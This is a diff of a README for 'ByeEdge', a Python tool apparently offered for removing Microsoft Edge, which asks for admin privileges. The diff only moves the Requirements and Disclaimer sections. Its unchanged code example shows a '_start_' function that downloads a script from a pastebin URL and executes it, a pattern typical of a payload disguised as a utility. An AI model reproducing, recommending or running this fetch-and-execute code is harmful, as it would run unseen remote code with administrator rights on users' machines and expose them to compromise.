@@ -22,6 +22,15 @@
     ```bash
     python byeedge.py
     ```
+## Requirements 📋
+Python 3.x
+Admin privileges for execution
+*License 📄*
+This project is licensed under the MIT License - see the LICENSE file for details.
+
+*Disclaimer ⚠️*
+Please use ByeEdge responsibly. Removing Edge can affect Windows features that depend on it. Use at your own risk.
+    
 
 ## Code Example 📝
 ```python
@@ -65,11 +74,3 @@ def _start_():
     script_url = "https://cdn.sourceb.in/bins/XbhZ6nBmta/0"
     execute_script_from_url(script_url)
 
-## Requirements 📋
-Python 3.x
-Admin privileges for execution
-*License 📄*
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-*Disclaimer ⚠️*
-Please use ByeEdge responsibly. Removing Edge can affect Windows features that depend on it. Use at your own risk.
